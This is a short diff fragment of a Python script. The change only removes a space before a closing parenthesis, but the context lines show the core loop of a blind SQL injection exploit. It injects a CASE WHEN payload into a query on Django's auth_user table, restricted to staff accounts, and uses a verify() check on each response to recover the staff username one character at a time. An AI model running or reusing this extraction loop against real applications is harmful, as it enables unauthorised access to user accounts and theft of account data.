@@ -23,7 +23,7 @@ if __name__ == "__main__":
 '%(char)s') WHEN 0 THEN CONCAT(email,'ABigDataHereFakeUserLoggedinABigDataHereABigDat\
 aHer') ELSE email END FROM auth_user WHERE is_staff ORDER BY 1,'1" % {
             "char": letter_or_digit,
-            "i": interation })
+            "i": interation})
             if verify(response):
                 username += letter_or_digit
                 break
